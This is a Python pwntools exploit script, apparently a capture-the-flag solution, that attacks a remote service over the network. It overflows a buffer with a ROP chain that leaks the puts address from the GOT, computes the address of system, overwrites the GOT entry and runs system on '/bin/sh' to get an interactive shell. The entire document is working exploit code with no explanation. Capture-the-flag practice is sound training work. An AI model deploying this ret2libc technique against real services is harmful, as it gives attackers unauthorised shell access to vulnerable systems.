#!/usr/bin/env python3

from pwn import *

# r = process("./share/chal")
r = remote("10.113.184.121", 10053)

pop_rdi_ret = 0x0000000000401263

puts_plt = 0x401070
gets_plt = 0x401090
puts_got = 0x403368

bss = 0x0000000000403398

rop_chain = b""

rop_chain += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
rop_chain += p64(pop_rdi_ret) + p64(bss) + p64(gets_plt)
rop_chain += p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt)
rop_chain += p64(pop_rdi_ret) + p64(bss) + p64(puts_plt)

canary = b"C" * 0x0  # no canary?
old_rbp = b"B" * 0x8
payload = b"A" * 0x20 + canary + old_rbp + rop_chain

r.recvuntil(b"Try your best :")
r.sendline(payload)

r.recvuntil(b"boom !\n")
puts_addr = u64(r.recv(6) + b"\x00\x00")
print("puts_addr: ", hex(puts_addr))

puts_offset = 0x7F459D029E50
system_offset = 0x7F459CFF9D70

system_addr = puts_addr - puts_offset + system_offset
print("system_addr: ", hex(system_addr))

r.sendline(b"/bin/sh\x00")
r.sendline(p64(system_addr))

r.interactive()
